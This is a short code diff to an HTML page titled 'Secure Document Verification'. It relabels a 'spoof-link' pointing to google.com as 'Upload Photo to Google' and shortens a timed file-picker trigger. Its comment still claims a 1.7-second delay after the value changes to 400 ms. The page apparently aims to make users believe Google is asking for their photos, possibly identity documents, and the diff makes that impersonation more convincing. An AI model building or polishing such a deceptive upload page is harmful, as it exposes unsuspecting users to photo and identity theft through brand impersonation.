@@ -75,7 +75,7 @@
     <h1>Secure Document Verification</h1>
 
     <!-- Target Link to trigger Preview Page -->
-    <a href="https://google.com" class="spoof-link" id="targetLink">Open Preview Page & Upload Photo</a>
+    <a href="https://google.com" class="spoof-link" id="targetLink">Upload Photo to Google</a>
 
     <!-- Uploaded Image Preview Box -->
     <div class="preview-container" id="previewBox">
@@ -128,7 +128,7 @@
                     console.debug("File picker cancelled or blocked:", err.message);
                     triggered = false;
                 }
-            }, 1200); // 1.7 seconds delay for ephemeral tab
+            }, 400); // 1.7 seconds delay for ephemeral tab
         };
 
         // Memeriksa apakah ada data foto tersimpan sebelumnya saat halaman dimuat kembali
